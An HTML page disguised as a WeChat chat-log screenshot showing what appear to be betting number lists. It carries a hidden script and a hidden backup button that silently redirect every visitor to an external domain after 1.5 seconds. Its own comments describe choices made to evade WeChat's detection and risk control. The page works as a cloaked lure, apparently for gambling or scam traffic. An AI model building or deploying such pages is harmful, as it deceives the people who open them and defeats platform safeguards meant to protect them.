<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 移除易被检测的meta refresh，改用JS延迟跳转 -->
    
    <!-- 优化微信分享标签，降低风控 -->
    <meta property="og:title" content="聊天记录">
    <meta property="og:description" content="与文件传输助手的聊天记录">
    <meta property="og:type" content="website">
    <title>聊天记录</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
        }
        body {
            background: #F5F5F5;
            padding-top: env(safe-area-inset-top);
            padding-bottom: env(safe-area-inset-bottom);
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
        }
        .wechat-nav {
            position: sticky;
            top: 0;
            background: #F7F7F7;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            border-bottom: 1px solid #E5E5E5;
            z-index: 999;
        }
        .nav-left, .nav-right {
            color: #007AFF;
            font-size: 17px;
            width: 40px;
        }
        .nav-right {
            text-align: right;
        }
        .nav-title-wrap {
            text-align: center;
            flex: 1;
        }
        .nav-title {
            font-size: 17px;
            font-weight: 500;
            color: #000;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 280px;
            margin: 0 auto;
        }
        .nav-date {
            font-size: 12px;
            color: #999;
            margin-top: 2px;
        }
        .chat-container {
            padding: 16px;
        }
        .chat-message {
            display: flex;
            margin-bottom: 16px;
            align-items: flex-start;
        }
        .avatar {
            width: 48px;
            height: 48px;
            border-radius: 4px;
            background: #eee center/cover no-repeat;
            margin-right: 10px;
            flex-shrink: 0;
        }
        .message-content-wrap {
            flex: 1;
            max-width: calc(100% - 58px);
        }
        .message-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 4px;
        }
        .nickname {
            font-size: 14px;
            color: #666;
        }
        .time {
            font-size: 14px;
            color: #999;
        }
        .message-bubble {
            background: #FFFFFF;
            border-radius: 8px;
            padding: 10px 14px;
            display: inline-block;
            position: relative;
            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
        }
        .message-bubble::before {
            content: "";
            position: absolute;
            left: -8px;
            top: 12px;
            border: 8px solid transparent;
            border-right-color: #FFFFFF;
        }
        .message-text {
            font-size: 17px;
            color: #000;
            line-height: 1.6;
            white-space: pre-line;
            word-break: break-all;
        }
        /* 隐藏备用按钮，不影响体验 */
        .backup-btn {
            display: none;
        }
    </style>
</head>
<body>
    <div class="wechat-nav">
        <div class="nav-left">&lt;</div>
        <div class="nav-title-wrap">
            <div class="nav-title">A涅槃重生小王与文件传输助手的聊天记录</div>
            <div class="nav-date">2026年4月25日</div>
        </div>
        <div class="nav-right">...</div>
    </div>

    <div class="chat-container">
        <div class="chat-message">
            <div class="avatar"></div>
            <div class="message-content-wrap">
                <div class="message-header">
                    <span class="nickname">A涅槃重生小王</span>
                    <span class="time">17:11:33</span>
                </div>
                <div class="message-bubble">
                    <div class="message-text">08-16-38-24各10米
-14-42-06-28各20米
-18-32-26-04-36各35米
-12-34-22各100米</div>
                </div>
            </div>
        </div>
    </div>

    <!-- 隐藏式备用跳转按钮，防止自动跳转失败 -->
    <button class="backup-btn" onclick="window.location.href='https://521nqx.xyz'">继续访问</button>

    <!-- 防拦截核心：延迟1.5秒纯JS跳转，页面完全加载后再执行 -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                window.location.href = "https://521nqx.xyz";
            }, 1500);
        });
    </script>
</body>
</html>
